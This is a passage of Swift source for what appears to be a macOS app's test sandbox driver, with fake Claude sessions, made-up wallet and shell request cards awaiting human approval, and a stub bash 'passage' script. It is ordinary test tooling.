        ("keys TEXT", "types TEXT and Return into the shown terminal (a sandbox session's: e.g. a command for its zsh)"),
        ("mouse on|off", "the shown session's program asks for mouse reporting (DECSET 1002 and 1006, as Claude Code's fullscreen does), or stops"),
        ("type TEXT", "types TEXT into the chat's composer (through its text view, as the keyboard does)"),
        ("send", "presses Return in the composer: the message goes to the fake session"),
        ("runblock [yes]", "the shown chat's last code block with a Run: shows what Run asks first, as the sheet; with yes, runs it as Run does once you confirm (tell it {\"op\": \"realShell\"} first to see its output)"),
        ("tell JSON", "hands a fake Claude (the selected one, or the one labelled \"to\") a FakeClaude op, e.g. '{\"op\": \"permission\", \"command\": \"swift build\"}' or '{\"op\": \"work\"}' (see Tests/VibeSwitcherTests/FakeClaude.swift)"),
        ("notify prepare|allow|deny", "a permission prompt's banner for the selected fake session (the sandbox posts no notifications): prepare reads its screen as posting the banner does (whether it gets Allow and Deny); allow or deny runs that banner's action (`PromptActions.handle`), a failure shown as the chat card's notice"),
        ("new [codex|shell|zsh] [LABEL]", "starts another fake session: a Claude, or a Codex or a plain shell (cat), or an interactive zsh on the sandbox's home"),
        ("confighold [outside|accept]", "the agents' config held for the fake lead (ConfigSeal): its team's worker bound (outside: none, so it's held as changed outside a team session), then the sandbox home's ~/.claude/settings.json, ~/.zshrc and seven skills changed (never yours); its card, with Accept, is under the lead's chat. accept clicks it"),
        ("push [click|decline]", "the fake lead asks to push (push_remote): its folder a scratch repository and a scratch bare remote as origin (never GitHub), three commits ahead; its card, with Push and Decline, is under the lead's chat. click or decline settles it as those buttons do"),
        ("clear", "ends and removes every fake session: the sidebar is empty, with its New Session menu"),
        ("views", "the main window's AppKit views: how many, how deep, and the most common kinds (a chat that grows them stalls layout)"),
        ("scroll top|middle|bottom", "scrolls the shown chat"),
        ("scroll settings top|middle|bottom|FRACTION", "scrolls the shown Settings tab (FRACTION: that far down, e.g. 0.4)"),
        ("size WxH", "resizes the main window's content (e.g. 1728x1015)"),
        ("board [N]", "adds N finished tasks (default 250) to the fake lead's board (start the lead first)"),
        ("churn [N]", "changes the fake lead's board N times (default 40), 0.15 s apart, each read and shown as a real change is"),
        ("publish [N]", "has the lead controller publish N times (default 50), each laid out and drawn, and times them"),
        ("hangs [reset]", "the sandbox's main-thread freezes (its hang reports, as the health digest tells them) and its longest wait between two beats (reset: from now on)"),
        ("startlead", "starts a real project lead (LeadController.startLead, as Project Lead does: the host first if none runs, its vault grant) in a new repository, its agent a fake Claude, and shows its chat; first thing after `run --empty`, no session host runs before it"),
        ("lead [FILE]", "shows a fake project lead's chat, at its end (started the first time, on FILE's transcript if given): a board of tasks, a withdrawn question, tool runs and workers' messages"),
        ("team", "starts a fake worker on the fake lead's running task, in its worktree (start the lead first); select it and tell it a permission to see it wait on its lead"),
        ("team named", "starts the fake lead's worker and a verifier titled as Claude Code 2.1.311 names them (worker-<slug>, verify-<slug>) and moves the lead's agent into its .vibeswitcher/worktrees (start the lead first): its team still folds under it"),
        ("ask [TEXT]", "puts an open question for you (TEXT, or a made-up one) on the fake lead's board (start the lead first): its row reads needs you"),
        ("unfold", "shows the selected lead's team under its row in the sidebar"),
        ("rotation", "shows the scheduled rotation chat line in the selected fake session"),
        ("replaced [N]", "shows the selected window session as a lead another session replaced, with N characters (default 200000) typed into it: the header's one line it makes"),
        ("answer", "answers the fake lead's open questions: its row reads as its terminal does again"),
        ("leadmail", "writes made-up messages between the fake lead and other projects' leads (start the lead first) to its private lead-mail record, one of them refused, and shows its Team tab: they're under Between leads"),
        ("extras", "adds to the fake lead's board (start the lead first) a proposal on a timer, a revised question, a task needing an audit, an all-done card and two results"),
        ("phone", "serves the phone's web app for this sandbox on a port of 127.0.0.1, one phone paired: STATE/phone.json says where, its token, and the Host and Tailscale-User-Login headers to send (as tailscale serve would)"),
        ("dictation key|nokey|note|ack|press|release|letgo|cancel|turnon", "push to talk in the composer (no microphone, no OpenAI: a made-up recording and transcript): a key saved or none, the one-time note about OpenAI shown again on the next press, the mic held down in the selected session's composer (a Claude session's through its fake /voice, see tell's \"voice\" op: until it listens or says why not), let go (release: until the text is in; letgo: once it waits for Claude's text), its ✕ clicked, the notice's Turn on Claude dictation clicked"),
        ("soak [MINUTES [every SECONDS] [hour CYCLES] [worker-mb MB] [without LIST]]|stop", "a working day's actions on a timer, each cycle (every 20 s): a fake Claude started and its chat shown, a prompt sent and a long reply streamed, a dictation through its /voice, the lead's chat and its Team tab, its board's checkpoints, an accessibility client's walk of the window, the oldest fake past 3 ended and removed; the footprint (the process's own task_info) and the per-session state each minute, what grew by class at minute 2 and the end, in STATE/soak.log. a wallet request filed in the chat, sent and answered, the wallet desk's clock moved the cycle's share of a simulated hour (CYCLES cycles, default 30) with its 15 s refreshes; each simulated hour's least footprint and the live counters (wallet desk, timers, boards), and RESULT soak-simulated-hour-growth-mb at the end. every other cycle a worker shaped like a real one (a task on the lead's board, a transcript of MB MB of tool calls, default 4, its steer inbox, its chat and its terminal fed a build's output) ended by the role sweep, its footprint once removed, and RESULT soak-worker-growth-mb. LIST leaves out sessions, stream, dictation, team, ax, reports, wallet, workers. With no MINUTES: the log so far"),
        ("wallet-ask [address] [--workspace W] [--from W] [--chain N] [--to 0x…] [--amount WEI] [--expires-in 90m] [--data 0x…] [--reason TEXT]", "the selected fake session's agent files a made-up transaction request, as vs-wallet request does: its card shows in that chat, waiting for Send to Wallet Manager; with address, from an 0x address, so the card also offers Sign in browser wallet; the options replace the made-up request's values (scripts/e2e/wallet-e2e.sh); --data makes it a contract call (an approve's calldata, say)"),
        ("shell-ask [COMMAND]", "the selected fake session's agent asks for a new shell running COMMAND (a made-up program unless given) in its folder, as vs-shell run does: its card shows in that chat, waiting for Run"),
        ("shell-click run|decline|dismiss", "presses that button on the newest shell request card in the selected chat (run starts the shell session in the sandbox's own host and selects it, and prints ran or the card's \"Not run: …\" line)"),
        ("shell-fail on|off", "on: the sandbox's own host refuses to start the shells a card's Run asks for, so the Run says why it didn't go; off: they start again"),
        ("wallet-card", "prints the newest wallet request card in the selected chat: its id, state, line, not-picked-up hint, transaction (tx HASH [EXPLORER URL], once signed and submitted) and the Wallet Manager's checks"),
        ("wallet-later MINUTES", "moves the wallet desk's clock MINUTES ahead (never back) and redraws the cards, e.g. for the not-picked-up hint"),
        ("wallet-click send|retry|discard|browser|settings|dismiss", "presses that button on the newest wallet request card of the selected session, on its strip or not (dismiss takes a finished one off the strip; send goes to the sandbox's fake passage, never the real one; browser serves the local page but never opens a browser: wallet-page shows it; settings opens Settings › Wallet)"),
        ("wallet-peer none|chosen|this-mac|this-mac-stopped", "no Wallet Manager peer chosen for the wallet desk (as with None in Settings › Wallet: cards offer the browser wallet and Open Settings instead of Send), or the made-up one again; this-mac: the Wallet Manager on this Mac chosen (in Settings › Wallet too), and a stand-in for it started with its local transport in the sandbox's own home, taking requests: Send writes into its folder and wallet-answer answers from it; this-mac-stopped: chosen, and the stand-in no longer taking requests (Send reads not reachable); the cards redraw"),
        ("wallet-page [NAME]", "draws the local Sign in browser wallet page as served (the one wallet-click browser opened, else one for a made-up request), in a web view of the sandbox's own with no wallet extension, light and dark: NAME-light.png, NAME-dark.png (default wallet-page)"),
        ("wallet-answer received|proposed|signed|submitted|rejected|failed", "the fake Wallet Manager's Mac answers the newest card's request: the card shows it, and the asking fake session gets it as a message"),
        ("wallet [STATE]", "shows a made-up wallet request card as the sheet, in STATE: " + Driver.walletCards.map(\.state).joined(separator: ", ") + " (all: every state, one under another); settings wallet shows its Settings tab"),
        ("select TEXT", "selects the first row whose title, project or task contains TEXT"),
        ("home", "shows the start page"),
        ("boost off|on|away|present|battery|battery-on|battery-low|veto|mark", "boost mark clicks the main window's Boost mark (Settings › Performance at Boost). Otherwise Boost mode in a made-up state (the power source, the charge, your presence and the usage made up): off; On on AC; Automatic away on AC (boosted), at the Mac, away on battery; On on battery with Also on battery at 86 % (boosted) or 24 %; or away on AC with the usage watch's veto. Settings and the menu-bar sheet show it"),
        ("settings [TAB] [OPTION]", "opens Settings on a category: " + SettingsTab.allCases.map(\.rawValue).joined(separator: ", ")
            + "; scrolled to and highlighting an option: an id in the settings catalog, or boost, review-floor (it makes the made-up project sandbox-floor first)"),
        ("settings-help NOTE", "opens the \"?\" popover of a footer in the Settings category shown (\"shot\" draws it): " + SettingsNote.allCases.map(\.rawValue).joined(separator: ", ")),
        ("settings-search [TEXT]", "types TEXT in Settings' search field, opening Settings if it's closed (no TEXT clears it), and says what it found"),
        ("settings-pick N|ID", "picks the Nth search result (from 1), or the option with that catalog id, as a click on it does"),
        ("toolchain [dismiss]", "shows or dismisses a fake developer tools notice"),
        ("sheet NAME", "shows a sheet on the window: " + (Driver.sheets.map(\.name) + Driver.windowSheets.map(\.name) + ["choose-folder", "new-session-menu"]).joined(separator: ", ")),
        ("close settings|sheet", "closes Settings or the sheet"),
        ("shot NAME", "draws each window, light and dark, into the shots folder"),
        ("panes on|off", "shows or collapses the sidebar and inspector, for a shot of the middle alone"),
        ("layershot NAME", "as shot, through the window's layer tree, for what cacheDisplay leaves out (lists, fills)"),
        ("pointer rows|areas TEXT|hover TEXT|hover-beside TEXT|drag FROM TO|drag-window FROM TO|copy|menu TEXT", "the pointer over the shown chat, as made-up events through its window: rows lists its messages' text views (where, their tooltip); hover moves the pointer onto the message holding TEXT; drag presses on the message holding FROM and lets go on the one holding TO; copy is ⌘C (to a pasteboard of the sandbox's own, never the general one), printing what it copied; menu right-clicks the message holding TEXT and prints its menu"),
        ("unproved", "connects again with a key the host doesn't hold: it refuses the app's proof and shows it no sessions"),
        ("quit", "quits (the host and fake sessions end with it)"),
    ]

    /// A made-up project with a lead's workflow.md (its own sensitive_paths, merge_policy auto, audit_finders 1, a
    /// verifier_model), for the review rules' floor; made once in the sandbox's home.
    static func floorProject(home: String) -> String {
        let root = ((home as NSString).appendingPathComponent("projects/sandbox-floor") as NSString).standardizingPath
        let file = root + "/.vibeswitcher/workflow.md"
        if !FileManager.default.fileExists(atPath: file) {
            try? VibePaths.ensurePrivate(URL(fileURLWithPath: root + "/.vibeswitcher"))
            let text = LeadWorkflow.updating(LeadWorkflow.template, with: [("merge_policy", "auto"), ("verifier_model", "fable"),
                                                                           ("sensitive_paths", ".claude/, AGENTS.md, .github/, src/vault/")])
            try? LeadWorkflow.write(Data(text.utf8), to: file)
        }
        return root
    }

    /// The sheets `sheet NAME` shows: a sheet a change adds or touches goes here, so a worker can photograph it.
    static let sheets: [(name: String, make: (Driver) -> AnyView)] = [
        // Settings › Project lead's review rules floor for the made-up project sandbox-floor, on a vault of its own
        // (never the host's): the floor raised above the project's values in places.
        ("review-floor", { driver in
            let root = Driver.floorProject(home: driver.home)
            let vault = LeadVault.Book().vault(folder: URL(fileURLWithPath: driver.home + "/review-floor-vault"), as: { .app })
            _ = try? vault.setReviewFloor(LeadReviewFloor(sensitivePaths: [".claude/", "AGENTS.md", ".github/", "src/vault/", "src/signing/"],
                                                          strictPaths: ["src/signing/**"], auditFinders: 2, mergePolicy: .askSensitive,
                                                          riskLines: 300, riskModel: true, verifierDifferent: true,
                                                          auditSamplePercent: 20), root: root)
            let editor = ReviewFloorEditor(vault: vault, projects: { [root] }, inline: true)
            editor.reload()
            return AnyView(Form { ReviewFloorSection(editor: editor) }.formStyle(.grouped).frame(width: 620, height: 720))
        }),
        ("toolchain-note", { _ in
            let before = ToolchainSnapshot(developerDir: "/Library/Developer/CommandLineTools", swift: "Apple Swift version 6.4.1",
                                           sdkPath: "/Library/Developer/CommandLineTools/SDKs/MacOSX27.sdk", sdkVersion: "27",
                                           commandLineTools: "27.0", xcodeExists: true)
            var after = before
            after.swift = "Apple Swift version 6.4.2"
            after.sdkVersion = "27.2"
            after.commandLineTools = "27.2"
            return AnyView(ToolchainNoteView(note: LeadWitness.toolchainText(before: before, after: after)!))
        }),
        ("new-project", { driver in
            AnyView(NewProjectSheet(model: NewProjectModel(location: driver.home + "/projects"),
                                    created: { [weak driver] folder, _ in driver?.refuse("starting a lead in \(folder)") },
                                    close: { [weak driver] in driver?.closeSheet() }))
        }),
        // The lead's results as the Lead view lists them: an update whose screenshot post_update kept (its worktree
        // since removed), and an older one whose path into a cleaned-up worktree is gone.
        // The menu bar icon as the app draws it for the fake sessions, with the boost mark while `boost` has it on, on a
        // strip of the bar's colour (the sandbox has no menu bar of its own).
        ("menu-bar", { driver in AnyView(MenuBarStrip(sessions: SessionTeams.split(driver.store.sessions).own, watch: driver.boostWatch)) }),
        ("results", { driver in AnyView(ResultsList(updates: Driver.results(home: driver.home)).frame(width: 460).padding(12)) }),
        // A lead's Team tab: a task at work, two blocked (one after it, one with no word why), one whose verifier ended
        // twice, merged ones of which
        // one was audited, one merged and then reverted, a question withdrawn lately and several answered, the Mac line, the Mac kept awake.
        // An all-done card with its batch's receipts summed (`LeadReceiptTotals`), its task list open.
        ("all-done", { driver in
            let mark = Driver.allDoneMark()
            return AnyView(AllDoneCard(mark: mark, chat: ChatModel(), expanded: [AllDoneCard.key(mark)]).frame(width: 560).padding(16))
        }),
        // The Statistics window's page (`StatisticsView`) on made-up stats for the last 7 days: two projects and one whose
        // board can't be read, Mac-wide figures; the quality sections, the breakdown, the comparison with working solo and
        // the trend. Shown loading, then filled, tall enough that a shot holds the whole page.
        ("statistics", { _ in
            let model = StatisticsModel(load: { _, range in Driver.statistics(range: range) })
            model.reload()
            return AnyView(StatisticsView(model: model).frame(width: StatisticsWindowController.size.width, height: 3300))
        }),
        // The Statistics page's "Compared with working solo" section on the same made-up stats, its method shown as
        // hovering its title shows it.
        ("statistics-estimate", { _ in
            let page = QualityPage(Driver.statisticsQuality(range: StatisticsRange.week.interval(now: Date())))
            return AnyView(Form { ComparedSectionView(page: page.compared, methodShown: true) }.formStyle(.grouped)
                .frame(width: StatisticsWindowController.size.width, height: 720))
        }),
        // The Team tab's Between leads on made-up messages, one refused and one opened whole.
        ("lead-mail", { _ in
            let records = Driver.leadMail(now: Date().timeIntervalSince1970)
            return AnyView(ScrollView { LeadMailList(feed: LeadMailFeed(records, project: "sandbox-lead"), openItems: [1]).padding(14) }
                .frame(width: 360, height: 620))
        }),
        ("lead-team", { driver in
            let team = Driver.leadTeam()
            return AnyView(LeadTeamView(root: driver.home + "/projects/sandbox-project", board: team.board, seen: team.seen, open: { _ in },
                                        decisions: team.decisions, keepingAwake: true,
                                        mac: MacLine(text: "Mac: load 16.5, 5 team sessions across 3 projects", spoken: "", isOver: false))
                .frame(width: 360, height: 980))
        }),
    ]

    /// The wallet request card (`WalletCard`) in each state, made-up values only, for `wallet STATE`.
    static let walletCards: [(state: String, card: WalletCardModel)] = {
        let request = WalletCardModel(
            id: "example-request", workspace: "example", from: "0x0000000000000000000000000000000000000001", wallet: .hardware,
            to: "0x0000000000000000000000000000000000000002", chainID: 42424242, asset: "GEN", amount: "12.5",
            reason: "Pay the example invoice for the test deployment.", requestedBy: "example-agent", state: .waiting, browserSignable: true)
        func with(_ state: WalletCardModel.State, checks: [WalletCardModel.Check] = []) -> WalletCardModel {
            var card = request
            card.state = state
            card.checks = checks
            return card
        }
        let hash = "0x" + String(repeating: "0", count: 61) + "abc"
        let cards: [(state: String, card: WalletCardModel)] = [
            ("waiting-for-you", with(.waiting)),
            ("sent", with(.sent)),
            ("unreachable", with(.unreachable(message: "the Wallet Manager peer is offline"))),
            ("received", with(.received, checks: [.init(name: "Recipient", ok: true, detail: "in the address book")])),
            ("proposed", { var card = with(.proposed(safeTxHash: hash)); card.wallet = .safe; return card }()),
            ("signed", with(.signed(txHash: hash, explorerURL: URL(string: "https://explorer.example/tx/" + hash)),
                            checks: [.init(name: "Recipient", ok: true, detail: "in the address book"),
                                     .init(name: "Amount", ok: true, detail: "under the daily limit")])),
            ("rejected", with(.rejected(reason: "the amount is over the daily limit"),
                              checks: [.init(name: "Recipient", ok: true, detail: "in the address book"),
                                       .init(name: "Amount", ok: false, detail: "12.5 GEN is over the 10 GEN daily limit"),
                                       .init(name: "Chain", ok: true)])),
            ("failed", with(.failed(message: "the hardware wallet was disconnected"))),
            ("expired", with(.expired)),
            ("sent-not-picked-up", { var card = with(.sent); card.notPickedUp = true; return card }()),
            ("signed-agent-missed", {
                var card = with(.signed(txHash: hash, explorerURL: URL(string: "https://explorer.example/tx/" + hash)))
                card.agentMissed = true
                return card
            }()),
            ("in-browser", with(.inBrowser)),
            ("sent-from-browser", with(.sentFromBrowser(txHash: hash, explorerURL: URL(string: "https://scan.chain.genlayer.com/tx/" + hash)))),
            ("rejected-in-wallet", with(.rejectedInWallet)),
            ("browser-no-answer", with(.browserNoAnswer)),
            ("no-wallet-manager", { var card = with(.waiting); card.setupNeeded = WalletCardModel.noPeerNote; return card }()),
            ("no-wallet-manager-wallet-id", {
                var card = with(.waiting)
                (card.from, card.wallet, card.browserSignable, card.setupNeeded) = ("example-hardware", nil, false, WalletCardModel.noPeerNote)
                return card
            }()),
            // Contract calls, mapped from made-up requests as a filed one is: a Safe's approveHash marked for a local
            // fork only (its badge beside the line), and a call nothing here decodes.
            ("safe-approve-hash", call("0xd4d9bdcd2ff4171f9c0e4a6b5d3f2817e6a9b0c1d2e3f405162738495a6b7c8d9e0f1a2b",
                                       reason: "LOCAL FORK ONLY\nApprove the example Safe transaction on the forked Safe.")),
            ("unknown-call", call("0x12345678" + String(repeating: "0", count: 63) + "1", reason: "Send 0 GEN, harmless")),
        ]
        func call(_ data: String, reason: String) -> WalletCardModel {
            let request = WalletRequest(createdAt: Date(timeIntervalSince1970: 1_793_448_000), expiresAt: Date(timeIntervalSince1970: 1_793_534_400),
                                        requestedBy: .init(project: "example", session: "example", label: "Local test"), workspace: "example",
                                        from: "0x0000000000000000000000000000000000000001", chainId: 4221, action: .call,
                                        to: "0x16F7fFed6fc5113b34188d79c632760d7A20915b", asset: "native", amount: "0", data: data, reason: reason)
            return WalletCardModel(request: request, requestedBy: "example-agent", label: "Local test", state: .waiting)
        }
        return cards
    }()

    /// The Wallet Manager peers the sandbox's fake `passage peers` lists: made up.
    static let walletPeers = [WalletPeerChoice(peerID: "0a1b2c3d", name: "Example Wallet Manager Mac"),
                             WalletPeerChoice(peerID: "0d0d0d0d", name: "Example laptop")]

    /// A fake `passage` in `folder`: `send` copies the file there and says it sent it; `inbox` prints `inbox.jsonl`
    /// (what `wallet-answer` puts there); `peers` prints `peers.jsonl`; `listen` sleeps until it's stopped by its pid.
    static func fakePassage(_ folder: String) -> String {
        """
        #!/bin/bash
        here=\(RecentProjects.shellQuote(folder))
        printf '%s\\n' "$*" >> "$here/calls"
        case "$1" in
        send) cp "$3" "$here/sent-$5"; printf 'sent\\t%s\\t%s\\t%s\\n' "$2" "$5" "$(wc -c < "$3" | tr -d ' ')"; exit 0 ;;
        inbox) cat "$here/inbox.jsonl" 2>/dev/null; exit 0 ;;
        peers) cat "$here/peers.jsonl" 2>/dev/null; exit 0 ;;
        listen) trap 'kill $! 2>/dev/null; exit 0' TERM; /bin/sleep 3600 & wait $!; exit 0 ;;
        esac
        exit 2
        """
    }

    /// `wallet-ask`: the selected fake session's agent files a made-up request, as `vs-wallet request` does
    /// (`WalletAsk.run`, the sandbox's vault placing it in that session, as the host would from its process).
    private func walletAsk(_ words: [String], _ reply: @escaping (Bool, String) -> Void) {
        guard let row = model.selectedRow, let id = row.hostID, let fake = fakeList.first(where: { $0.id == id }) else {
            return reply(false, "no fake session selected: chat NAME first")
        }
        let address = words.first == "address"
        var values = ["--workspace": "example", "--from": address ? "0x0000000000000000000000000000000000000001" : "example-hardware",
                      "--chain": "42424242", "--to": "0x0000000000000000000000000000000000000002", "--amount": "12500000000000000000",
                      "--expires-in": "24h"]
        var rest = words.dropFirst(address ? 1 : 0)
        var data: String?
        var reason = "Pay the example invoice for the test deployment."
        while let option = rest.first {
            guard values[option] != nil || ["--data", "--reason"].contains(option), rest.count >= 2 else {
                return reply(false, "wallet-ask [address] [--workspace W] [--from W] [--chain N] [--to 0x…] [--amount WEI] [--expires-in 90m] "
                             + "[--data 0x…] [--reason TEXT]: not \(option)")
            }
            let value = rest.dropFirst().first!
            switch option {
            case "--data": data = value
            case "--reason": reason = value
            default: values[option] = value
            }
            rest = rest.dropFirst(2)
        }
        let arguments = ["request"] + ["--workspace", "--from", "--chain", "--to", "--amount", "--expires-in"].flatMap { [$0, values[$0]!] }
            + (data.map { ["--data", $0] } ?? []) + ["--reason", reason, "--label", fake.label]
        // The process is in the selected fake session, as the host would tell.
        let vault = walletVault.vault(folder: state.appendingPathComponent("wallet/vault"), as: { .session(id.uuidString) }, userOpened: true)
        let ran = WalletAsk.run(arguments, cwd: fake.cwd, walletManager: walletPeer.isEmpty ? .noPeer : .ready,
                               folder: walletDesk.folder, now: walletClock.now(), vault: vault)
        guard ran.status == 0 else { return reply(false, ran.error) }
        walletDesk.refresh { [weak self] in self?.settle { reply(true, ran.output) } }
    }

    /// The newest card of the selected session's requests, on its strip or not (a sent one leaves the strip, and is
    /// still the one `wallet-answer` answers).
    private var walletCard: WalletCardModel? {
        guard let id = model.selectedRow?.hostID?.uuidString.lowercased() else { return nil }
        return walletDesk.cards.last { walletDesk.sessions[$0.id] == id }
    }

    /// `shell-ask [COMMAND]`: the selected fake session's agent asks for a shell, as `vs-shell run` does (`ShellAsk.run`,
    /// the sandbox's vault placing it in that session, as the host would from its process).
    private func shellAsk(_ command: String, _ reply: @escaping (Bool, String) -> Void) {
        guard let row = model.selectedRow, let id = row.hostID, let fake = fakeList.first(where: { $0.id == id }) else {
            return reply(false, "no fake session selected: chat NAME first")
        }
        let line = command.isEmpty
            ? "printf 'Example program: deploying to the local test network\\n'; printf 'Continue? [y/N] '; read answer; echo \"you said $answer\""
            : command
        let vault = walletVault.vault(folder: state.appendingPathComponent("wallet/vault"), as: { .session(id.uuidString) }, userOpened: true)
        let ran = ShellAsk.run(["run", "--label", "Local test", "--", line], cwd: fake.cwd, folder: shellDesk.folder, vault: vault,
                               atOnce: preferences.letAgentsOpenShells)
        guard ran.status == 0 else { return reply(false, ran.error) }
        shellDesk.refresh { [weak self] in self?.settle { reply(true, ran.output) } }
    }

    /// `shell-click run|decline|dismiss`: that button on the newest shell card in the selected session's chat.
    private func shellClick(_ what: String, _ reply: @escaping (Bool, String) -> Void) {
        let actions: [String: ShellDesk.Action] = ["run": .run, "decline": .decline, "dismiss": .dismiss]
        guard let action = actions[what] else { return reply(false, "shell-click run, decline or dismiss") }
        guard let card = model.selectedRow?.hostID.flatMap({ shellDesk.cards(for: $0).last }) else {
            return reply(false, "no shell request in this chat: shell-ask first")
        }
        let said: (String) -> Void = { [weak self] outcome in
            guard let self else { return }
            let now = shellDesk.cards.first { $0.id == card.id }
            settle { reply(true, "\(what)\(outcome): the card is now \(now.map { ShellCard.title($0.state) } ?? "gone")") }
        }
        guard action == .run else { return shellDesk.act(action, on: card.id) { said("") } }
        shellDesk.run(card.id) { outcome in
            switch outcome {
            case .ran: said(" ran")
            case .refused(let reason): said(" (\(reason))")
            }
        }
    }

    /// `wallet-card`: the newest card as lines a script reads (`state Received`, `check chain failed …`).
    private func walletCardText() -> (Bool, String) {
        guard let card = walletCard else { return (false, "no wallet request in this chat: wallet-ask first") }
        var lines = ["id \(card.id)", "state \(WalletCardModel.title(card.state))", "detail \(card.detail)",
                     "from \(card.from) on \(card.chainText)", "not-picked-up \(card.notPickedUp ? "yes" : "no")",
                     "on-strip \(WalletDesk.shows(card, dismissed: walletDesk.dismissed) ? "yes" : "no")"]
        switch card.state {
        case .signed(let hash, let url), .sentFromBrowser(let hash, let url):
            lines.append("tx \(hash)" + (url.map { " \($0.absoluteString)" } ?? ""))
        default: break
        }
        lines += card.checks.map { "check \($0.name) \($0.ok ? "ok" : "failed") \($0.detail)" }
        lines.append("actions " + card.actions.map(\.rawValue).joined(separator: " "))
        return (true, lines.joined(separator: "\n"))
    }

    /// `wallet-click send|retry|discard|browser|settings|dismiss`: that button on the newest card in the selected session's chat.
    private func walletClick(_ what: String, _ reply: @escaping (Bool, String) -> Void) {
        guard let action = WalletCardModel.Action(rawValue: what) else { return reply(false, "wallet-click send, retry, discard, browser, settings or dismiss") }
        guard let card = walletCard else { return reply(false, "no wallet request in this chat: wallet-ask first") }
        guard card.actions.contains(action) else {
            return reply(false, "the card (\(WalletCardModel.title(card.state))) has no \(action.title): " + card.actions.map(\.title).joined(separator: ", "))
        }
        walletDesk.act(action, on: card.id) { [weak self] in
            self?.settle { reply(true, "\(action.title): the card is now \(self?.walletCard.map { WalletCardModel.title($0.state) } ?? "gone")") }
        }
    }

    /// `wallet-answer STATUS`: the fake Wallet Manager's Mac answers the newest card's request (received, proposed, signed,
    /// submitted, rejected, failed), as a result in the fake inbox; the desk takes it.
    private func walletAnswer(_ what: String, _ reply: @escaping (Bool, String) -> Void) {
        guard let status = WalletResult.Status(rawValue: what) else {
            return reply(false, "wallet-answer " + WalletResult.Status.allCases.map(\.rawValue).joined(separator: "|"))
        }
        guard let card = walletCard else { return reply(false, "no wallet request in this chat: wallet-ask first") }
        let sequence = (walletSequence[card.id] ?? 0) + 1
        walletSequence[card.id] = sequence
        let hash = "0x" + String(repeating: "0", count: 61) + "abc"
        var result = WalletResult(id: card.id, sequence: sequence, createdAt: Date(timeIntervalSince1970: floor(Date().timeIntervalSince1970)),
                                 status: status, checks: [.init(name: "Recipient", ok: true, detail: "in the address book"),
                                                          .init(name: "Amount", ok: status != .rejected, detail: status == .rejected ? "over the daily limit" : "under the daily limit")],
                                 message: status == .submitted ? "Signed on the hardware wallet and submitted." : status == .rejected ? "The amount is over the daily limit." : "")
        if status == .submitted || status == .failed {
            result.txHash = hash
            result.explorerURL = "https://explorer.example/tx/" + hash
        }
        if status == .failed { result.message = "The hardware wallet was disconnected." }
        do {
            let data = try result.encoded()
            // The Wallet Manager on this Mac answers in its folder, under a dot-name and renamed; the desk's watch on
            // the folder takes it, and the poll below only waits for that.
            if walletPeer == WalletAsk.WalletManager.onThisMac {
                try VibePaths.writePrivate(data, to: walletLocal.fromFolder.appendingPathComponent("wallet-result-\(card.id)-\(sequence).json"))
                return walletDesk.poll { [weak self] in
                    self?.settle { reply(true, "the Wallet Manager on this Mac said \(status.rawValue): the card is now \(self?.walletCard.map { WalletCardModel.title($0.state) } ?? "gone")") }
                }
            }
            let peer = Driver.walletPeers[0].peerID
            let dir = walletPassage.appendingPathComponent("inbox/\(peer)", isDirectory: true)
            try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
            let name = WalletResult.fileName(card.id)
            let path = dir.appendingPathComponent(String(format: "20261031T1200%02dZ-", Int(sequence)) + name).path
            try data.write(to: URL(fileURLWithPath: path))
            let line = WalletRequestFormat.Value.object([.init("peerID", .string(peer)), .init("name", .string(name)),
                                                 .init("size", .integer(Int64(data.count))), .init("path", .string(path))]).encoded()
            let list = walletPassage.appendingPathComponent("inbox.jsonl")
            try (((try? Data(contentsOf: list)) ?? Data()) + line + Data("\n".utf8)).write(to: list)
        } catch {
            return reply(false, "the fake Wallet Manager couldn't write its result: \(error)")
        }
        walletDesk.poll { [weak self] in
            self?.settle { reply(true, "the Wallet Manager said \(status.rawValue): the card is now \(self?.walletCard.map { WalletCardModel.title($0.state) } ?? "gone")") }
        }
    }

    /// `wallet-page NAME`: the local page as served, from the page Sign in browser wallet opened, else from a server of its
    /// own for a made-up request (stopped once drawn), loaded in a web view with no wallet extension, drawn light and dark.
    private func walletPage(_ name: String, _ reply: @escaping (Bool, String) -> Void) {
        var url = walletPageURL
        if url == nil {
            let request = WalletRequest.make(requestedBy: .init(project: "sandbox-project", session: UUID().uuidString.lowercased(), label: "example-agent"),
                                             workspace: "example", from: "0x0000000000000000000000000000000000000001", chainId: 42_424_242,
                                             action: .transfer, to: "0x0000000000000000000000000000000000000002", asset: "native",
                                             amount: "12500000000000000000", reason: "Pay the example invoice for the test deployment.")
            guard let page = WalletSignPage.html(for: request) else { return reply(false, "no page for the made-up request") }
            let server = WalletSignServer(page: page)
            do { url = try server.start { _ in } } catch { return reply(false, "the page's server didn't start: \(error)") }
            walletPageServer = server
        }
        guard let url else { return reply(false, "no page") }
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = .nonPersistent()
        let view = WKWebView(frame: NSRect(x: 0, y: 0, width: 720, height: 760), configuration: configuration)
        let loaded = WalletPageLoad()
        view.navigationDelegate = loaded
        let window = Sandbox.pageWindow(view)
        window.orderFront(nil)
        walletPageView = (window, view, loaded)
        let base = Sandbox.fileName(name)
        var written: [String] = []
        func finish(_ ok: Bool, _ text: String) {
            walletPageServer?.stop()
            walletPageServer = nil
            walletPageView?.window.close()
            walletPageView = nil
            reply(ok, text)
        }
        func take(_ modes: ArraySlice<(String, NSAppearance.Name)>) {
            guard let (mode, appearance) = modes.first else { return finish(true, written.joined(separator: "\n")) }
            view.appearance = NSAppearance(named: appearance)
            // The page's colors follow prefers-color-scheme: give it a moment to restyle, then snapshot.
            view.evaluateJavaScript("document.getElementById('status').textContent") { status, _ in
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
                    view.takeSnapshot(with: nil) { image, error in
                        let file = self.shots.appendingPathComponent("\(base)-\(mode).png")
                        guard let image, let tiff = image.tiffRepresentation, let bitmap = NSBitmapImageRep(data: tiff),
                              let png = bitmap.representation(using: .png, properties: [:]), (try? png.write(to: file)) != nil else {
                            return finish(false, "couldn't draw \(file.lastPathComponent): \(error.map { "\($0)" } ?? "no image")")
                        }
                        written.append(file.path + (status.map { "  (status: \($0))" } ?? ""))
                        take(modes.dropFirst())
                    }
                }
            }
        }
        loaded.done = { failure in
            if let failure { return finish(false, "the page didn't load: \(failure)") }
            take([("light", .aqua), ("dark", .darkAqua)][...])
        }
        view.load(URLRequest(url: url))
    }

